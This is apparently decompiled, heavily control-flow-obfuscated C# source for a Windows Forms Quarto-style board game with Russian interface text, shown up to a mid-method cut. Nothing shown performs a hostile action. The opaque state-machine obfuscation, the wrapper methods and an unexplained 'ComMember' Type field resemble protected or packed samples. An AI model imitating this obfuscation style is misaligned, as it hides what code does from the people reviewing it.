using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -784691441;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x9B63ABABu) % 8u)
					{
					case 7u:
						Big = big;
						num = (int)((num2 * 1864267147) ^ 0x24548F3C);
						continue;
					case 5u:
						num = (int)(num2 * 693955126) ^ -1870051483;
						continue;
					case 4u:
						num = ((int)num2 * -717201919) ^ 0x35BE3902;
						continue;
					case 3u:
						Point = point;
						num = ((int)num2 * -1548877527) ^ -1877788223;
						continue;
					case 2u:
						Square = square;
						num = (int)((num2 * 549264901) ^ 0x6447161A);
						continue;
					case 0u:
						Dark = dark;
						num = ((int)num2 * -1163934710) ^ -484874268;
						continue;
					default:
						return;
					case 6u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1996413798;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xADD3831Au) % 10u)
				{
				case 9u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) >= 296)
					{
						num = -342425756;
						num3 = -342425756;
					}
					else
					{
						num = -1997038104;
						num3 = -1997038104;
					}
					continue;
				}
				case 8u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num2 * -1666461633) ^ -1635328575;
					continue;
				}
				case 6u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1135363114) ^ 0xE6CF7EE;
					continue;
				case 5u:
					num = ((int)num2 * -758203665) ^ -2007094588;
					continue;
				case 4u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 489175581) ^ -706568195;
					continue;
				case 2u:
					num = ((int)num2 * -597468227) ^ 0x10721597;
					continue;
				case 1u:
					num = ((int)num2 * -808181076) ^ 0x3ED99895;
					continue;
				case 0u:
					num = -1103641550;
					continue;
				default:
					return;
				case 7u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1314276872;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4A437EDCu) % 19u)
				{
				case 18u:
					num4 = 0;
					num = (int)(num2 * 157214549) ^ -102196351;
					continue;
				case 17u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = (int)(num2 * 600085016) ^ -359739683;
					continue;
				case 16u:
					num4++;
					num = (int)(num2 * 1899703521) ^ -408645021;
					continue;
				case 15u:
					num3 = 0;
					num = 1633284146;
					continue;
				case 14u:
					Paint_Storage();
					num = ((int)num2 * -68520412) ^ 0x690978DF;
					continue;
				case 13u:
					storage = new Figurine[4, 4];
					num = (int)(num2 * 1534898017) ^ -1177853399;
					continue;
				case 11u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1050632240;
						num8 = -1050632240;
					}
					else
					{
						num7 = -760202307;
						num8 = -760202307;
					}
					num = num7 ^ ((int)num2 * -919820917);
					continue;
				}
				case 10u:
					Paint_Board();
					num = (int)(num2 * 1782678723) ^ -1924280203;
					continue;
				case 9u:
					num = (int)(num2 * 351025322) ^ -1931415246;
					continue;
				case 8u:
					num = 1446328671;
					continue;
				case 6u:
					num = (int)(num2 * 2072681818) ^ -1724825080;
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = ((int)num2 * -533112896) ^ -96676320;
					continue;
				case 4u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = 268837309;
						num6 = 268837309;
					}
					else
					{
						num5 = 648572326;
						num6 = 648572326;
					}
					num = num5 ^ ((int)num2 * -1381763249);
					continue;
				}
				case 3u:
					flag2 = num4 < 4;
					num = 983664171;
					continue;
				case 2u:
					flag = num3 < 4;
					num = 653985246;
					continue;
				case 1u:
					num3++;
					num = (int)(num2 * 1031549692) ^ -2047452882;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -2123078817) ^ -855757587;
					continue;
				case 12u:
					break;
				default:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		float num8 = default(float);
		float num13 = default(float);
		int num7 = default(int);
		int num6 = default(int);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num5 = default(float);
		float num9 = default(float);
		bool flag2 = default(bool);
		bool point = default(bool);
		bool big = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 796393820;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4EDA2128u) % 41u)
				{
				case 40u:
					num8 = num13 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 895067508) ^ -2043994772;
					continue;
				case 39u:
				{
					int num16;
					int num17;
					if (!board[num7, num6].Square)
					{
						num16 = 238299504;
						num17 = 238299504;
					}
					else
					{
						num16 = 1351530327;
						num17 = 1351530327;
					}
					num = num16 ^ ((int)num2 * -480805942);
					continue;
				}
				case 38u:
					num = (int)(num2 * 616946423) ^ -567372314;
					continue;
				case 37u:
					Form1.smethod_24(graphics_, brush_, num5 + (float)(num6 * size), num5 + (float)(num7 * size), num8, num8);
					num = 1627538185;
					continue;
				case 36u:
					num = (int)((num2 * 120012952) ^ 0x69107257);
					continue;
				case 35u:
					num = 1716955697;
					continue;
				case 34u:
					num = ((int)num2 * -1412805449) ^ -1796976479;
					continue;
				case 33u:
					num9 = 0.7f;
					num = 434152921;
					continue;
				case 32u:
				{
					int num18;
					if (num6 < 4)
					{
						num = 1385939951;
						num18 = 1385939951;
					}
					else
					{
						num = 282763248;
						num18 = 282763248;
					}
					continue;
				}
				case 31u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -239164880) ^ 0x8CECBD3;
					continue;
				case 30u:
					num = (int)((num2 * 1323034412) ^ 0x33B13AC3);
					continue;
				case 29u:
					num = (int)((num2 * 557272038) ^ 0x7515C39F);
					continue;
				case 28u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num5 + (float)(num6 * size), num5 + (float)(num7 * size), num8, num8);
					num = ((int)num2 * -1241930437) ^ -797391112;
					continue;
				case 27u:
				{
					int num21;
					int num22;
					if (flag2)
					{
						num21 = 235894607;
						num22 = 235894607;
					}
					else
					{
						num21 = 927080297;
						num22 = 927080297;
					}
					num = num21 ^ (int)(num2 * 795448935);
					continue;
				}
				case 26u:
					num = (int)(num2 * 1406468782) ^ -916365484;
					continue;
				case 25u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)((num2 * 1866045898) ^ 0x4336A1E8);
					continue;
				case 24u:
					num6++;
					num = 1140856659;
					continue;
				case 22u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1914180575) ^ -704841336;
					continue;
				case 21u:
				{
					int num19;
					int num20;
					if (point)
					{
						num19 = -1762739403;
						num20 = -1762739403;
					}
					else
					{
						num19 = -1606806283;
						num20 = -1606806283;
					}
					num = num19 ^ ((int)num2 * -6874823);
					continue;
				}
				case 20u:
				{
					float num12 = 1f - num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num13 = (float)size * num9;
					num5 = (float)size * (num12 / 2f);
					num = 1938263086;
					continue;
				}
				case 19u:
					num = ((int)num2 * -919474371) ^ 0x2B671CF6;
					continue;
				case 18u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num6 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = 1617863636;
					continue;
				case 17u:
				{
					int num14;
					int num15;
					if (!board[num7, num6].Dark)
					{
						num14 = 1704912859;
						num15 = 1704912859;
					}
					else
					{
						num14 = 694092165;
						num15 = 694092165;
					}
					num = num14 ^ (int)(num2 * 651731739);
					continue;
				}
				case 16u:
					num = (int)(num2 * 2026355486) ^ -1735829966;
					continue;
				case 15u:
				{
					float num12 = 1f - num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num5 = (float)size * (num12 / 2f);
					num8 = num13 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 462116271;
					continue;
				}
				case 14u:
					num = (int)((num2 * 1495423139) ^ 0x5FA7F127);
					continue;
				case 13u:
					point = board[num7, num6].Point;
					num = (int)(num2 * 402880688) ^ -305680300;
					continue;
				case 12u:
					num7++;
					num = (int)(num2 * 558696329) ^ -1095468419;
					continue;
				case 11u:
					num = (int)(num2 * 1347969980) ^ -209599502;
					continue;
				case 10u:
					big = board[num7, num6].Big;
					num = 9628238;
					continue;
				case 9u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = 248773732;
						num11 = 248773732;
					}
					else
					{
						num10 = 764272439;
						num11 = 764272439;
					}
					num = num10 ^ (int)(num2 * 1679518015);
					continue;
				}
				case 8u:
					flag2 = board[num7, num6] != null;
					num = ((int)num2 * -747438880) ^ -2104034656;
					continue;
				case 7u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num7 = 0;
					num = ((int)num2 * -981167486) ^ -1000149813;
					continue;
				case 6u:
					Form1.smethod_28(graphics_, brush_, num5 + (float)(num6 * size), num5 + (float)(num7 * size), num8, num8);
					num = (int)((num2 * 1371116453) ^ 0x399C3125);
					continue;
				case 5u:
					flag = num7 < 4;
					num = 1600460981;
					continue;
				case 4u:
					num9 = 1f;
					num = ((int)num2 * -235540889) ^ 0x6F9F6CA3;
					continue;
				case 3u:
					num6 = 0;
					num = 1140856659;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (big)
					{
						num3 = 1027322242;
						num4 = 1027322242;
					}
					else
					{
						num3 = 283733478;
						num4 = 283733478;
					}
					num = num3 ^ (int)(num2 * 898135118);
					continue;
				}
				case 1u:
					brush_ = Form1.smethod_26();
					num = 1296940199;
					continue;
				default:
					return;
				case 0u:
					break;
				case 23u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		Brush brush_ = default(Brush);
		int num3 = default(int);
		int num4 = default(int);
		Graphics graphics_ = default(Graphics);
		float num5 = default(float);
		float num6 = default(float);
		float num12 = default(float);
		bool flag3 = default(bool);
		float num13 = default(float);
		float num11 = default(float);
		bool flag = default(bool);
		bool point = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1274974302;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3FD9AD83u) % 38u)
				{
				case 37u:
					num = (int)((num2 * 85240983) ^ 0x1B285C27);
					continue;
				case 36u:
					brush_ = Form1.smethod_26();
					num = 1726345972;
					continue;
				case 35u:
				{
					int num16;
					if (storage[num3, num4].Big)
					{
						num = 1045296321;
						num16 = 1045296321;
					}
					else
					{
						num = 1162677953;
						num16 = 1162677953;
					}
					continue;
				}
				case 34u:
					Form1.smethod_24(graphics_, brush_, num5, num5, num6, num6);
					num = 1522941789;
					continue;
				case 33u:
				{
					int num21;
					if (num4 >= 4)
					{
						num = 1885668368;
						num21 = 1885668368;
					}
					else
					{
						num = 340950457;
						num21 = 340950457;
					}
					continue;
				}
				case 32u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num5, num5, num6, num6);
					num = ((int)num2 * -1115608504) ^ -1977039615;
					continue;
				case 31u:
					num4++;
					num = 1242220816;
					continue;
				case 30u:
					num12 = 0.7f;
					num = 181955915;
					continue;
				case 29u:
					num3 = 0;
					num = ((int)num2 * -866130656) ^ -1166919516;
					continue;
				case 28u:
					num = (int)(num2 * 1015504813) ^ -816325797;
					continue;
				case 27u:
				{
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num3, num4]));
					int num9;
					int num10;
					if (!storage[num3, num4].Dark)
					{
						num9 = 114101361;
						num10 = 114101361;
					}
					else
					{
						num9 = 1171330599;
						num10 = 1171330599;
					}
					num = num9 ^ (int)(num2 * 878173532);
					continue;
				}
				case 26u:
					flag3 = num3 < 4;
					num = 656184698;
					continue;
				case 25u:
				{
					int num19;
					int num20;
					if (flag3)
					{
						num19 = 1622101740;
						num20 = 1622101740;
					}
					else
					{
						num19 = 747574621;
						num20 = 747574621;
					}
					num = num19 ^ ((int)num2 * -1194344292);
					continue;
				}
				case 24u:
					num13 = 1f - num12 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 2019087256;
					continue;
				case 23u:
					num11 = (float)size * num12;
					num5 = (float)size * (num13 / 2f) - 4f;
					num = ((int)num2 * -924538924) ^ 0x2788DC96;
					continue;
				case 22u:
				{
					int num17;
					int num18;
					if (!flag)
					{
						num17 = 1972279040;
						num18 = 1972279040;
					}
					else
					{
						num17 = 1028223643;
						num18 = 1028223643;
					}
					num = num17 ^ (int)(num2 * 506713006);
					continue;
				}
				case 21u:
				{
					int num14;
					int num15;
					if (point)
					{
						num14 = -955500889;
						num15 = -955500889;
					}
					else
					{
						num14 = -801794794;
						num15 = -801794794;
					}
					num = num14 ^ (int)(num2 * 543755610);
					continue;
				}
				case 20u:
					num13 = 1f - num12 * 0.4f / (float)Form1.smethod_27(2.0);
					num5 = (float)size * (num13 / 2f) - 4f;
					num6 = num11 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num3, num4].Point;
					num = 1173922050;
					continue;
				case 19u:
					num4 = 0;
					num = 1014246461;
					continue;
				case 18u:
					num12 = 1f;
					num = (int)((num2 * 983580879) ^ 0x2A42E1F2);
					continue;
				case 16u:
					num = (int)((num2 * 2107217807) ^ 0x646E1162);
					continue;
				case 15u:
					num6 = num11 * 0.9f / (float)Form1.smethod_27(2.0);
					flag2 = num4 < 2;
					num = ((int)num2 * -233191178) ^ -1448101358;
					continue;
				case 14u:
					num = ((int)num2 * -151825387) ^ -1121110650;
					continue;
				case 13u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = -1881067596;
						num8 = -1881067596;
					}
					else
					{
						num7 = -1130849285;
						num8 = -1130849285;
					}
					num = num7 ^ ((int)num2 * -207558297);
					continue;
				}
				case 12u:
					num = ((int)num2 * -2046681578) ^ 0x535221A2;
					continue;
				case 11u:
					Form1.smethod_28(graphics_, brush_, num5, num5, num6, num6);
					num = (int)((num2 * 29125656) ^ 0x2CF0E897);
					continue;
				case 10u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num3, num4]), Form1.smethod_16((Control)(object)pictureBox[num3, num4])));
					num = (int)(num2 * 1451568862) ^ -654762925;
					continue;
				case 9u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = 1065932990;
					continue;
				case 7u:
					num3++;
					num = ((int)num2 * -987865612) ^ -1798676311;
					continue;
				case 6u:
					num = (int)((num2 * 1321583390) ^ 0xE457F2D);
					continue;
				case 5u:
					num = (int)((num2 * 1332370013) ^ 0xD029A58);
					continue;
				case 4u:
					num = ((int)num2 * -2040493100) ^ 0x1F1FDBCD;
					continue;
				case 3u:
					num = (int)((num2 * 1867839851) ^ 0x6C5AFDD8);
					continue;
				case 2u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -262880253) ^ 0x4E6539EE;
					continue;
				case 1u:
					num = ((int)num2 * -171426219) ^ 0x358B371D;
					continue;
				case 0u:
					flag = storage[num3, num4] != null;
					num = 658435393;
					continue;
				default:
					return;
				case 17u:
					break;
				case 8u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		bool flag = default(bool);
		int num3 = default(int);
		bool flag2 = default(bool);
		int num4 = default(int);
		bool flag3 = default(bool);
		int num9 = default(int);
		while (true)
		{
			int num = 1817034883;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x22F9A3B3u) % 33u)
				{
				case 32u:
					flag = num3 < 4;
					num = 1199399316;
					continue;
				case 31u:
					step = 1;
					num = ((int)num2 * -1571795473) ^ -1023189380;
					continue;
				case 29u:
					flag2 = turn;
					num = (int)((num2 * 714933982) ^ 0x1E30D444);
					continue;
				case 28u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = 100413760;
						num8 = 100413760;
					}
					else
					{
						num7 = 1696139431;
						num8 = 1696139431;
					}
					num = num7 ^ ((int)num2 * -489606477);
					continue;
				}
				case 27u:
					num3 = 0;
					num = ((int)num2 * -612275494) ^ -148960590;
					continue;
				case 26u:
					num = ((int)num2 * -1358577323) ^ -581473606;
					continue;
				case 25u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -1212377216) ^ -523969000;
					continue;
				case 24u:
					num4++;
					num = ((int)num2 * -641032667) ^ 0x508773B9;
					continue;
				case 23u:
					step = 0;
					num = ((int)num2 * -635145078) ^ 0x6D4694B5;
					continue;
				case 22u:
					num = (int)(num2 * 534344551) ^ -938312939;
					continue;
				case 21u:
					flag3 = num4 < 4;
					num = 998228286;
					continue;
				case 20u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1632214251) ^ -1459203638;
					continue;
				case 19u:
					num = ((int)num2 * -194766201) ^ -394752354;
					continue;
				case 18u:
					num = ((int)num2 * -1830742835) ^ -128016382;
					continue;
				case 17u:
				{
					int num11;
					int num12;
					if (!flag3)
					{
						num11 = 500390205;
						num12 = 500390205;
					}
					else
					{
						num11 = 1162719459;
						num12 = 1162719459;
					}
					num = num11 ^ (int)(num2 * 425776925);
					continue;
				}
				case 16u:
					num = (int)(num2 * 1844642348) ^ -837970828;
					continue;
				case 15u:
				{
					int num10 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.Blue);
					num = (int)(num2 * 658735564) ^ -716882669;
					continue;
				}
				case 14u:
					num3++;
					num = ((int)num2 * -1153294770) ^ -814990622;
					continue;
				case 13u:
					num9 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1166528981) ^ -2004590942;
					continue;
				case 12u:
					num = ((int)num2 * -282173034) ^ 0x72827EA7;
					continue;
				case 11u:
					num4 = 0;
					num = 1027909667;
					continue;
				case 9u:
					num = (int)((num2 * 1640842856) ^ 0x62D0A193);
					continue;
				case 8u:
					num = (int)((num2 * 1733501952) ^ 0x4F5E7F88);
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 442386292) ^ -670070219;
					continue;
				case 6u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -2082308189) ^ 0x2815035A;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 432299951;
					continue;
				case 4u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -852457637;
						num6 = -852457637;
					}
					else
					{
						num5 = -1258852869;
						num6 = -1258852869;
					}
					num = num5 ^ ((int)num2 * -2128027178);
					continue;
				}
				case 3u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = 760215377;
					continue;
				case 2u:
					num = ((int)num2 * -1486832368) ^ 0x4861A49E;
					continue;
				case 1u:
					num = 298811672;
					continue;
				case 0u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -623855628) ^ 0xF9C0DCB;
					continue;
				default:
					return;
				case 10u:
					break;
				case 30u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = 400759279;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5B11A45Au) % 4u)
				{
				case 1u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)(num2 * 1502567303) ^ -859079243;
					continue;
				case 0u:
					num = (int)((num2 * 2107063682) ^ 0x1CD6DCC9);
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Expected O, but got Unknown
		Point point = default(Point);
		int num10 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		bool flag2 = default(bool);
		int num5 = default(int);
		bool flag = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = 404492889;
			while (true)
			{
				uint num2;
				int num11;
				switch ((num2 = (uint)num ^ 0x35F7AD69u) % 25u)
				{
				case 24u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 496962358) ^ -335311017;
					continue;
				case 23u:
					num10 = point.X / size;
					num = ((int)num2 * -272847262) ^ -1601750416;
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 160048401) ^ -930702538;
					continue;
				case 21u:
					num8++;
					num = (int)((num2 * 1241318595) ^ 0x4B30423B);
					continue;
				case 20u:
					num = (int)((num2 * 265373534) ^ 0x20562563);
					continue;
				case 18u:
					num = (int)(num2 * 115256537) ^ -691193841;
					continue;
				case 16u:
					num9 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1587333023) ^ 0x7976A37D;
					continue;
				case 15u:
				{
					int num6;
					int num7;
					if (flag2)
					{
						num6 = -1862611882;
						num7 = -1862611882;
					}
					else
					{
						num6 = -654750178;
						num7 = -654750178;
					}
					num = num6 ^ ((int)num2 * -1849292624);
					continue;
				}
				case 14u:
					num5 = 0;
					num = 1570913582;
					continue;
				case 13u:
					Form1.smethod_5((Control)(object)borderBox[num8, num5], Color.White);
					num5++;
					num = 986926019;
					continue;
				case 12u:
					num = ((int)num2 * -1136982989) ^ 0x3170125C;
					continue;
				case 11u:
				{
					int num14;
					if (num5 >= 4)
					{
						num = 613456047;
						num14 = 613456047;
					}
					else
					{
						num = 2126238199;
						num14 = 2126238199;
					}
					continue;
				}
				case 10u:
					num11 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num9, num10]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_01a2;
				case 9u:
					num = ((int)num2 * -29119756) ^ 0x4D22E26F;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 1668115501) ^ -456027362;
					continue;
				case 7u:
					num8 = 0;
					num = ((int)num2 * -217518246) ^ -683405393;
					continue;
				case 6u:
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.Red);
					num = ((int)num2 * -660151862) ^ 0x1EFBE5DA;
					continue;
				case 5u:
					num10 -= 4;
					num = ((int)num2 * -1820834641) ^ 0x6D026006;
					continue;
				case 4u:
					flag = num8 < 4;
					num = 1154896058;
					continue;
				case 3u:
					flag3 = num10 > 1;
					num = (int)((num2 * 1798508408) ^ 0x540D2E59);
					continue;
				case 2u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = 583534128;
						num13 = 583534128;
					}
					else
					{
						num12 = 1616485699;
						num13 = 1616485699;
					}
					num = num12 ^ ((int)num2 * -61811747);
					continue;
				}
				case 1u:
					if (storage[num9, num10] != null)
					{
						num = 2015921609;
						continue;
					}
					num11 = 0;
					goto IL_01a2;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1685585548;
						num4 = 1685585548;
					}
					else
					{
						num3 = 1464482267;
						num4 = 1464482267;
					}
					num = num3 ^ (int)(num2 * 825155590);
					continue;
				}
				default:
					return;
				case 17u:
					break;
				case 19u:
					return;
					IL_01a2:
					flag2 = (byte)num11 != 0;
					num = 1584660736;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ea: Expected O, but got Unknown
		int num4 = default(int);
		int num3 = default(int);
		bool flag4 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num6 = default(int);
		int num5 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = -1302154397;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0xD8D173ADu) % 30u)
				{
				case 29u:
					num = (int)(num2 * 1709826392) ^ -1170460635;
					continue;
				case 28u:
					num = ((int)num2 * -700372357) ^ -843529730;
					continue;
				case 26u:
					num4++;
					num = -1852484075;
					continue;
				case 25u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -691811888) ^ 0x36BCB9FA;
					continue;
				case 24u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 1697143221) ^ -432583554;
					continue;
				case 23u:
					num4 = 0;
					num = -296553080;
					continue;
				case 22u:
					num3 = 0;
					num = (int)(num2 * 2098302997) ^ -1960786912;
					continue;
				case 21u:
					num3++;
					num = (int)(num2 * 997743427) ^ -198542954;
					continue;
				case 19u:
					num = (int)((num2 * 1867904146) ^ 0x4767D4DA);
					continue;
				case 18u:
				{
					int num10;
					int num11;
					if (flag4)
					{
						num10 = 1552387385;
						num11 = 1552387385;
					}
					else
					{
						num10 = 859238524;
						num11 = 859238524;
					}
					num = num10 ^ ((int)num2 * -457099709);
					continue;
				}
				case 17u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -970114917) ^ -1740562754;
					continue;
				case 16u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num6 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1323262024) ^ 0x19789995);
					continue;
				case 15u:
				{
					int num14;
					int num15;
					if (!flag)
					{
						num14 = 693151881;
						num15 = 693151881;
					}
					else
					{
						num14 = 1027391325;
						num15 = 1027391325;
					}
					num = num14 ^ (int)(num2 * 565807975);
					continue;
				}
				case 14u:
					num = (int)(num2 * 213434101) ^ -1595291090;
					continue;
				case 13u:
					num = ((int)num2 * -1442489718) ^ -1646742199;
					continue;
				case 12u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
